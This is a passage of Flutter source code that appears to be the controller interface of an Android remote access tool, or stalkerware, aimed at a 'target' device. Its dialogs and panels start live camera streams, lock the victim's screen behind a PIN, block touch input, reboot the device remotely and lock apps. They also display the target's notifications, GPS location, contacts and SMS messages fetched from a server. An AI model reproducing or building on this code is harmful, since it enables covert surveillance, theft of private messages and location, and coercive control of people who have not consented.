            ],
          ),
        ),
        if (buttons.isNotEmpty)
          Wrap(
            spacing: 10,
            runSpacing: 10,
            children: buttons,
          ),
      ],
    );
  }

  // ═══════════════════════════════════════════════════════════
  // APPS PANEL
  // ═══════════════════════════════════════════════════════════
  Widget _buildAppsPanel(AppPalette C) {
    if (_loadingApps) {
      return _SoftPanel(
        C: C,
        padding: const EdgeInsets.all(20),
        child: Center(
          child: Column(
            children: [
              CircularProgressIndicator(
                  color: C.accent, strokeWidth: 2),
              const SizedBox(height: 10),
              Text(
                'LOADING APPS...',
                style: TextStyle(
                  color: C.accent,
                  fontSize: 9,
                  fontFamily: 'Orbitron',
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
        ),
      );
    }

    if (_appList.isEmpty) return const SizedBox.shrink();

    final lockedCount =
        _appList.where((a) => a['locked'] == true).length;

    return Padding(
      padding: const EdgeInsets.only(top: 10),
      child: _SoftPanel(
        C: C,
        padding: const EdgeInsets.all(12),
        accent: C.primaryHi.withOpacity(0.5),
        child: Column(
          children: [
            Row(
              children: [
                _Led(color: C.primaryHi, size: 7),
                const SizedBox(width: 8),
                Icon(Icons.apps_rounded,
                    color: C.accent, size: 14),
                const SizedBox(width: 8),
                Text(
                  '${_appList.length} APPS',
                  style: TextStyle(
                    color: C.accent,
                    fontSize: 10,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1.5,
                  ),
                ),
                const Spacer(),
                if (lockedCount > 0)
                  Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 8, vertical: 3),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(4),
                      color: C.primaryLo,
                      border: Border.all(
                          color: C.primaryHi.withOpacity(0.6), width: 1),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        _Led(color: C.primaryHi, size: 4),
                        const SizedBox(width: 4),
                        Text(
                          '$lockedCount LOCKED',
                          style: TextStyle(
                            color: C.primaryHi,
                            fontSize: 7,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                  ),
                const SizedBox(width: 8),
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 6, vertical: 3),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(4),
                    color: C.primaryLo.withOpacity(0.4),
                    border: Border.all(
                        color: C.accent.withOpacity(0.6), width: 1),
                  ),
                  child: Text(
                    'PIN: $_adminPin',
                    style: TextStyle(
                      color: C.accent,
                      fontSize: 7,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 10),
            ...List.generate(_appList.length, (i) {
              final app = _appList[i];
              final appName = app['name']?.toString() ?? 'Unknown';
              final pkg = app['package']?.toString() ?? '';
              final isLocked = app['locked'] == true;

              return _AppRow(
                C: C,
                appName: appName,
                package: pkg,
                isLocked: isLocked,
                onToggle: () =>
                    _showLockAppDialog(appName, pkg, isLocked),
              );
            }),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // CHAT PANEL
  // ═══════════════════════════════════════════════════════════
  Widget _buildChatPanel(AppPalette C) {
    return Padding(
      padding: const EdgeInsets.only(top: 10),
      child: _SoftPanel(
        C: C,
        padding: const EdgeInsets.all(12),
        accent: C.accentHi.withOpacity(0.5),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              height: 160,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(8),
                color: C.bgDeep,
                border: Border.all(color: C.bgDark, width: 1.5),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.6),
                    offset: const Offset(0, 1),
                    blurRadius: 2,
                  ),
                ],
              ),
              child: _chat.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.chat_bubble_outline_rounded,
                              color: C.textSub, size: 30),
                          const SizedBox(height: 8),
                          Text(
                            'NO MESSAGES YET',
                            style: TextStyle(
                              color: C.text.withOpacity(0.4),
                              fontSize: 9,
                              fontFamily: 'Orbitron',
                              fontWeight: FontWeight.w900,
                              letterSpacing: 1.5,
                            ),
                          ),
                        ],
                      ),
                    )
                  : ListView.builder(
                      controller: _chatScroll,
                      padding: const EdgeInsets.all(10),
                      itemCount: _chat.length,
                      itemBuilder: (_, i) {
                        final m = _chat[i];
                        final isOwner = m['from'] == 'owner';
                        return Align(
                          alignment: isOwner
                              ? Alignment.centerRight
                              : Alignment.centerLeft,
                          child: Container(
                            margin:
                                const EdgeInsets.symmetric(vertical: 3),
                            padding: const EdgeInsets.symmetric(
                                horizontal: 10, vertical: 6),
                            constraints: BoxConstraints(
                              maxWidth: MediaQuery.of(context).size.width *
                                  0.55,
                            ),
                            decoration: BoxDecoration(
                              borderRadius: BorderRadius.circular(10),
                              gradient: isOwner
                                  ? LinearGradient(
                                      begin: Alignment.topLeft,
                                      end: Alignment.bottomRight,
                                      colors: [C.accentHi, C.accent],
                                    )
                                  : null,
                              color: isOwner
                                  ? null
                                  : Colors.black.withOpacity(0.5),
                              border: isOwner
                                  ? Border.all(
                                      color: C.accentHi.withOpacity(0.8),
                                      width: 1,
                                    )
                                  : Border.all(
                                      color: C.bgDark, width: 1),
                            ),
                            child: Column(
                              crossAxisAlignment: isOwner
                                  ? CrossAxisAlignment.end
                                  : CrossAxisAlignment.start,
                              children: [
                                Text(
                                  m['text'] ?? '',
                                  style: TextStyle(
                                    color: isOwner
                                        ? Colors.white
                                        : C.text,
                                    fontSize: 10,
                                    fontFamily: 'ShareTechMono',
                                    fontWeight: FontWeight.w700,
                                  ),
                                ),
                                const SizedBox(height: 2),
                                Text(
                                  m['time'] ?? '',
                                  style: TextStyle(
                                    color: isOwner
                                        ? Colors.white.withOpacity(0.6)
                                        : C.text.withOpacity(0.4),
                                    fontSize: 7,
                                    fontFamily: 'ShareTechMono',
                                  ),
                                ),
                              ],
                            ),
                          ),
                        );
                      },
                    ),
            ),
            const SizedBox(height: 10),
            Row(
              children: [
                Expanded(
                  child: _SoftInset(
                    C: C,
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    child: TextField(
                      controller: _chatCtrl,
                      style: TextStyle(
                        color: C.text,
                        fontSize: 11,
                        fontFamily: 'ShareTechMono',
                        fontWeight: FontWeight.w700,
                      ),
                      cursorColor: C.accent,
                      decoration: InputDecoration(
                        hintText: 'Type message to target...',
                        hintStyle: TextStyle(
                          color: C.text.withOpacity(0.3),
                          fontSize: 10,
                          fontFamily: 'ShareTechMono',
                        ),
                        border: InputBorder.none,
                        contentPadding:
                            const EdgeInsets.symmetric(vertical: 12),
                      ),
                      onSubmitted: _sendChat,
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                _SendButton(
                  C: C,
                  onTap: () => _sendChat(_chatCtrl.text),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // LOG PANEL
  // ═══════════════════════════════════════════════════════════
  Widget _buildLogPanel(AppPalette C) {
    if (_log.isEmpty) return const SizedBox.shrink();
    return Padding(
      padding: const EdgeInsets.only(top: 10),
      child: _SoftPanel(
        C: C,
        padding: const EdgeInsets.all(12),
        child: Container(
          height: 100,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(6),
            color: C.bgDeep,
            border: Border.all(color: C.bgDark, width: 1),
          ),
          padding: const EdgeInsets.all(8),
          child: ListView.builder(
            itemCount: _log.length > 10 ? 10 : _log.length,
            itemBuilder: (_, i) => Padding(
              padding: const EdgeInsets.symmetric(vertical: 1),
              child: Text(
                _log[i],
                style: TextStyle(
                  color: C.text.withOpacity(0.6),
                  fontSize: 8,
                  fontFamily: 'ShareTechMono',
                  fontWeight: FontWeight.w700,
                ),
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DIALOGS — helper untuk _buildDialog
  // ═══════════════════════════════════════════════════════════
  void _showRestartDialog() {
    final C = AppTheme.current.value;
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.restart_alt_rounded,
        iconColor: C.accent,
        title: 'RESTART DEVICE',
        subtitle:
            'Target device will restart using PowerManager reflection.',
        child: const SizedBox.shrink(),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: C.textSub,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'RESTART',
            color: C.accent,
            height: 42,
            icon: Icons.restart_alt_rounded,
            onTap: () {
              Navigator.pop(context);
              _cmd('reboot_device');
            },
          ),
        ],
      ),
    );
  }

  void _showLiveDialog() {
    final C = AppTheme.current.value;
    showDialog(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black.withOpacity(0.95),
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(10),
          child: _SoftPanel(
            C: C,
            padding: EdgeInsets.zero,
            accent: C.primaryHi,
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 14, vertical: 10),
                  decoration: BoxDecoration(
                    color: Colors.black,
                    borderRadius:
                        const BorderRadius.vertical(top: Radius.circular(9)),
                    border: Border(
                      bottom: BorderSide(color: C.primaryHi, width: 1.5),
                    ),
                  ),
                  child: Row(
                    children: [
                      _Led(color: C.primaryHi, size: 8),
                      const SizedBox(width: 8),
                      Text(
                        'LIVE — $_liveTitle',
                        style: TextStyle(
                          color: C.accent,
                          fontSize: 11,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                      const Spacer(),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(4),
                          color: C.primaryLo,
                          border: Border.all(
                              color: C.primaryHi.withOpacity(0.6),
                              width: 1),
                        ),
                        child: Text(
                          '$_fps FPS',
                          style: TextStyle(
                            color: C.primaryHi,
                            fontSize: 8,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 0.5,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                Container(
                  constraints: BoxConstraints(
                    maxHeight:
                        MediaQuery.of(context).size.height * 0.55,
                  ),
                  color: Colors.black,
                  child: _frame != null
                      ? Image.memory(
                          _frame!,
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                          filterQuality: FilterQuality.low,
                        )
                      : SizedBox(
                          height: 180,
                          child: Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                CircularProgressIndicator(
                                  color: C.primaryHi,
                                  strokeWidth: 2,
                                ),
                                const SizedBox(height: 10),
                                Text(
                                  'WAITING FOR FRAMES...',
                                  style: TextStyle(
                                    color: C.accent,
                                    fontSize: 9,
                                    fontFamily: 'Orbitron',
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: 1.5,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                ),
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.black,
                    borderRadius:
                        const BorderRadius.vertical(bottom: Radius.circular(9)),
                    border: Border(
                      top: BorderSide(color: C.primaryHi, width: 1.5),
                    ),
                  ),
                  child: Row(
                    children: [
                      Expanded(
                        child: _MetalButton(
                          label: 'SWITCH',
                          color: C.textSub,
                          height: 40,
                          icon: Icons.cameraswitch_rounded,
                          onTap: () {
                            final isFront =
                                _liveTitle.contains('DEPAN');
                            _stopLive();
                            Future.delayed(
                                const Duration(milliseconds: 300),
                                () => _startLive('live_camera_start',
                                    isFront ? 'back' : 'front'));
                          },
                        ),
                      ),
                      const SizedBox(width: 8),
                      Expanded(
                        child: _MetalButton(
                          label: 'STOP',
                          color: C.primaryHi,
                          height: 40,
                          icon: Icons.stop_rounded,
                          onTap: () {
                            _stopLive();
                            Navigator.pop(ctx);
                          },
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final C = AppTheme.current.value;
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.lock_rounded,
        iconColor: C.primaryHi,
        title: 'LOCK LIVE + CHAT',
        subtitle: 'Target locked + two-way chat',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              C: C,
              child: TextField(
                controller: msgCtrl,
                style: TextStyle(
                  color: C.text,
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                ),
                cursorColor: C.accent,
                decoration: InputDecoration(
                  hintText: 'Lock screen message',
                  hintStyle: TextStyle(color: C.textSub, fontSize: 10),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
            const SizedBox(height: 10),
            _SoftInset(
              C: C,
              child: TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                style: TextStyle(
                  color: C.text,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3,
                ),
                cursorColor: C.accent,
                decoration: InputDecoration(
                  hintText: 'Unlock PIN (1234)',
                  hintStyle: TextStyle(color: C.textSub, fontSize: 10),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: C.textSub,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'LOCK LIVE',
            color: C.primaryHi,
            height: 42,
            icon: Icons.lock_rounded,
            onTap: () {
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty
                  ? 'DEVICE LOCKED BY ADMINISTRATOR'
                  : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty
                  ? '1234'
                  : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
          ),
        ],
      ),
    );
  }

  void _showCamPicker(Function(String) onPick) {
    final C = AppTheme.current.value;
    String sel = 'back';
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => _buildDialog(
          icon: Icons.camera_alt_rounded,
          iconColor: C.primaryHi,
          title: 'SELECT CAMERA',
          subtitle: 'Pilih kamera target',
          child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((v) {
              final isSel = sel == v;
              return GestureDetector(
                onTap: () => ss(() => sel = v),
                child: Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 20, vertical: 14),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10),
                    color: isSel
                        ? C.primaryHi.withOpacity(0.15)
                        : C.bgDark,
                    border: Border.all(
                      color: isSel ? C.primaryHi : C.textSub,
                      width: isSel ? 1.5 : 1,
                    ),
                  ),
                  child: Column(
                    children: [
                      Icon(
                        v == 'back'
                            ? Icons.camera_rear_rounded
                            : Icons.camera_front_rounded,
                        color: isSel ? C.primaryHi : C.textSub,
                        size: 26,
                      ),
                      const SizedBox(height: 6),
                      Text(
                        v == 'back' ? 'BACK' : 'FRONT',
                        style: TextStyle(
                          color: isSel ? C.primaryHi : C.textSub,
                          fontSize: 9,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Orbitron',
                          letterSpacing: 1.2,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            }).toList(),
          ),
          actions: [
            _MetalButton(
              label: 'CANCEL',
              color: C.textSub,
              height: 42,
              onTap: () => Navigator.pop(ctx),
            ),
            _MetalButton(
              label: 'SELECT',
              color: C.primaryHi,
              height: 42,
              icon: Icons.check_rounded,
              onTap: () {
                Navigator.pop(ctx);
                onPick(sel);
              },
            ),
          ],
        ),
      ),
    );
  }

  void _inputDialog(String title, String label, Function(String) onDone,
      {bool isNumber = false, String hint = ''}) {
    final C = AppTheme.current.value;
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.edit_rounded,
        iconColor: C.primaryHi,
        title: title.toUpperCase(),
        subtitle: label,
        child: _SoftInset(
          C: C,
          child: TextField(
            controller: ctrl,
            keyboardType:
                isNumber ? TextInputType.number : TextInputType.text,
            style: TextStyle(
              color: C.text,
              fontSize: 12,
              fontFamily: 'ShareTechMono',
            ),
            cursorColor: C.accent,
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(color: C.textSub, fontSize: 10),
              border: InputBorder.none,
              contentPadding: EdgeInsets.symmetric(vertical: 12),
            ),
          ),
        ),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: C.textSub,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'SEND',
            color: C.primaryHi,
            height: 42,
            icon: Icons.send_rounded,
            onTap: () {
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
          ),
        ],
      ),
    );
  }

  void _showTouchBlockDialog() {
    final C = AppTheme.current.value;
    final durationCtrl = TextEditingController(text: '5');
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.touch_app,
        iconColor: C.primaryHi,
        title: 'CUSTOM TOUCH BLOCK',
        subtitle: 'Block all touch input on target device',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              C: C,
              child: TextField(
                controller: durationCtrl,
                keyboardType: TextInputType.number,
                style: TextStyle(
                  color: C.text,
                  fontSize: 16,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 2,
                ),
                cursorColor: C.accent,
                decoration: InputDecoration(
                  hintText: 'Duration (seconds)',
                  hintStyle: TextStyle(color: C.textSub, fontSize: 10),
                  border: InputBorder.none,
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
            const SizedBox(height: 10),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(6),
                color: C.primaryLo.withOpacity(0.4),
                border: Border.all(
                    color: C.primaryHi.withOpacity(0.4), width: 1),
              ),
              child: Row(
                children: [
                  Icon(Icons.info_outline_rounded,
                      color: C.primaryHi, size: 12),
                  const SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      'Touch will be disabled for the specified duration',
                      style: TextStyle(
                        color: C.text.withOpacity(0.6),
                        fontSize: 8,
                        fontFamily: 'ShareTechMono',
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'CANCEL',
            color: C.textSub,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'BLOCK',
            color: C.primaryHi,
            height: 42,
            icon: Icons.touch_app,
            onTap: () {
              Navigator.pop(context);
              final duration = durationCtrl.text.trim();
              if (duration.isEmpty || int.tryParse(duration) == null) {
                _toast('Please enter valid duration', c: C.accent);
                return;
              }
              final seconds = int.parse(duration);
              if (seconds <= 0 || seconds > 300) {
                _toast('Duration must be between 1-300 seconds',
                    c: C.accent);
                return;
              }
              _cmd('touch_block', extra: duration);
              _toast('Touch blocked for $duration seconds',
                  c: C.primaryHi);
            },
          ),
        ],
      ),
    );
  }

  void _showChangePinDialog() {
    final C = AppTheme.current.value;
    final pinCtrl = TextEditingController();
    final confirmCtrl = TextEditingController();
    showDialog(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.security_rounded,
        iconColor: C.primaryHi,
        title: 'CHANGE ADMIN PIN',
        subtitle: 'PIN saat ini: $_adminPin',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              C: C,
              child: TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                obscureText: true,
                maxLength: 6,
                style: TextStyle(
                  color: C.text,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3,
                ),
                cursorColor: C.accent,
                decoration: InputDecoration(
                  hintText: 'PIN BARU (4-6 digit)',
                  hintStyle: TextStyle(color: C.textSub, fontSize: 10),
                  border: InputBorder.none,
                  counterText: '',
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
            const SizedBox(height: 10),
            _SoftInset(
              C: C,
              child: TextField(
                controller: confirmCtrl,
                keyboardType: TextInputType.number,
                obscureText: true,
                maxLength: 6,
                style: TextStyle(
                  color: C.text,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3,
                ),
                cursorColor: C.accent,
                decoration: InputDecoration(
                  hintText: 'KONFIRMASI PIN',
                  hintStyle: TextStyle(color: C.textSub, fontSize: 10),
                  border: InputBorder.none,
                  counterText: '',
                  contentPadding: EdgeInsets.symmetric(vertical: 12),
                ),
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'BATAL',
            color: C.textSub,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'UBAH',
            color: C.primaryHi,
            height: 42,
            icon: Icons.check_rounded,
            onTap: () {
              final pin = pinCtrl.text.trim();
              final confirm = confirmCtrl.text.trim();
              if (pin.isEmpty || pin.length < 4) {
                _toast('PIN minimal 4 digit', c: C.accent);
                return;
              }
              if (pin != confirm) {
                _toast('PIN tidak cocok!', c: C.primaryHi);
                return;
              }
              _adminPin = pin;
              Navigator.pop(context);
              _toast('PIN admin berhasil diubah',
                  c: C.primaryHi);
              setState(() {});
            },
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DATA DISPLAY DIALOGS
  // ═══════════════════════════════════════════════════════════
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http
          .get(Uri.parse('$baseUrl/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        _showListSheet(
          'NOTIFICATIONS (${list.length})',
          list,
          Icons.notifications_rounded,
          (item) => {
            'title': item['title']?.toString() ?? '-',
            'subtitle': item['body']?.toString() ?? '',
          },
        );
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  void _imgDialog(String b64, String title) {
    final C = AppTheme.current.value;
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
        context: context,
        barrierColor: Colors.black.withOpacity(0.9),
        builder: (_) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(12),
          child: _SoftPanel(
            C: C,
            padding: EdgeInsets.zero,
            accent: C.accent,
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.black,
                    borderRadius:
                        const BorderRadius.vertical(top: Radius.circular(9)),
                    border: Border(
                      bottom: BorderSide(color: C.accent, width: 1),
                    ),
                  ),
                  child: Row(
                    children: [
                      _Led(color: C.accent, size: 7),
                      const SizedBox(width: 10),
                      Text(
                        title.toUpperCase(),
                        style: TextStyle(
                          color: C.accent,
                          fontSize: 12,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                    ],
                  ),
                ),
                ClipRRect(
                  borderRadius: const BorderRadius.vertical(
                      bottom: Radius.circular(9)),
                  child: Image.memory(bytes, fit: BoxFit.contain),
                ),
              ],
            ),
          ),
        ),
      );
    } catch (_) {
      _toast('Image decode failed');
    }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    final C = AppTheme.current.value;
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.my_location_rounded,
        iconColor: C.primaryHi,
        title: 'GPS LOCATION',
        subtitle: 'Target coordinates',
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _SoftInset(
              C: C,
              padding: const EdgeInsets.all(12),
              child: Row(
                children: [
                  Icon(Icons.location_on_rounded,
                      color: C.primaryHi, size: 14),
                  const SizedBox(width: 8),
                  Text(
                    'LAT: $lat',
                    style: TextStyle(
                      color: C.primaryHi,
                      fontSize: 11,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.w700,
                      letterSpacing: 1,
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 8),
            _SoftInset(
              C: C,
              padding: const EdgeInsets.all(12),
              child: Row(
                children: [
                  Icon(Icons.location_on_rounded,
                      color: C.primaryHi, size: 14),
                  const SizedBox(width: 8),
                  Text(
                    'LNG: $lng',
                    style: TextStyle(
                      color: C.primaryHi,
                      fontSize: 11,
                      fontFamily: 'ShareTechMono',
                      fontWeight: FontWeight.w700,
                      letterSpacing: 1,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          _MetalButton(
            label: 'CLOSE',
            color: C.textSub,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
          _MetalButton(
            label: 'OPEN MAPS',
            color: C.primaryHi,
            height: 42,
            icon: Icons.map_rounded,
            onTap: () => launchUrl(
              Uri.parse(
                  'https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication,
            ),
          ),
        ],
      ),
    );
  }

  void _textDialog(String title, String content) {
    final C = AppTheme.current.value;
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => _buildDialog(
        icon: Icons.text_snippet_rounded,
        iconColor: C.accentHi,
        title: title.toUpperCase(),
        subtitle: 'Extracted data',
        child: Container(
          constraints: const BoxConstraints(maxHeight: 300),
          child: SingleChildScrollView(
            child: _SoftInset(
              C: C,
              padding: const EdgeInsets.all(12),
              child: SelectableText(
                content,
                style: TextStyle(
                  color: C.text,
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                  height: 1.5,
                ),
              ),
            ),
          ),
        ),
        actions: [
          _MetalButton(
            label: 'CLOSE',
            color: C.textSub,
            height: 42,
            onTap: () => Navigator.pop(context),
          ),
        ],
      ),
    );
  }

  void _contactsSheet(List contacts) {
    _showListSheet(
      'CONTACTS (${contacts.length})',
      contacts,
      Icons.person_rounded,
      (c) => {
        'title': c['name']?.toString() ?? '-',
        'subtitle': c['number']?.toString() ?? '-',
      },
    );
  }

  void _smsSheet(List sms) {
    _showListSheet(
      'SMS (${sms.length})',
      sms,
      Icons.sms_rounded,
      (s) => {
        'title': s['address']?.toString() ?? '-',
        'subtitle': s['body']?.toString() ?? '',
      },
    );
  }

  void _showListSheet(
    String title,
    List items,
    IconData icon,
    Map<String, String> Function(dynamic) mapFn,
  ) {
    final C = AppTheme.current.value;
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (_) => Container(
        height: MediaQuery.of(context).size.height * 0.7,
        decoration: BoxDecoration(
          borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [C.bg, C.bgDark, C.bgDeep],
          ),
        ),
        child: SafeArea(
          top: false,
          child: Column(
            children: [
              Container(
                margin: const EdgeInsets.only(top: 10),
                width: 50,
                height: 4,
                decoration: BoxDecoration(
                  color: C.textSub,
                  borderRadius: BorderRadius.circular(2),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(14),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: C.primaryLo,
                        border: Border.all(
                            color: C.primaryHi.withOpacity(0.6), width: 1),
                      ),
                      child: Icon(icon, color: C.primaryHi, size: 16),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Text(
                        title,
                        style: TextStyle(
                          color: C.accent,
                          fontSize: 12,
                          fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.5,
                        ),
                      ),
                    ),
                    _MetalIconButton(
                      C: C,
                      icon: Icons.close_rounded,
                      size: 30,
                      onTap: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: ListView.builder(
                  padding: const EdgeInsets.symmetric(horizontal: 14),
                  itemCount: items.length,
                  itemBuilder: (_, i) {
                    final data = mapFn(items[i]);
                    return Container(
                      margin: const EdgeInsets.only(bottom: 8),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(8),
                        color: Colors.black.withOpacity(0.5),
                        border: Border.all(
                            color: C.bgDark, width: 1),
                      ),
                      child: Row(
                        children: [
                          Container(
                            width: 34,
                            height: 34,
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              color: C.primaryLo,
                              border: Border.all(
                                  color: C.primaryHi.withOpacity(0.5),
                                  width: 1),
                            ),
                            child: Icon(icon,
                                color: C.primaryHi, size: 14),
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment:
                                  CrossAxisAlignment.start,
                              children: [
                                Text(
                                  data['title'] ?? '-',
                                  style: TextStyle(
                                    color: C.text,
                                    fontSize: 11,
                                    fontFamily: 'ShareTechMono',
                                    fontWeight: FontWeight.w700,
                                  ),
                                  maxLines: 1,
                                  overflow: TextOverflow.ellipsis,
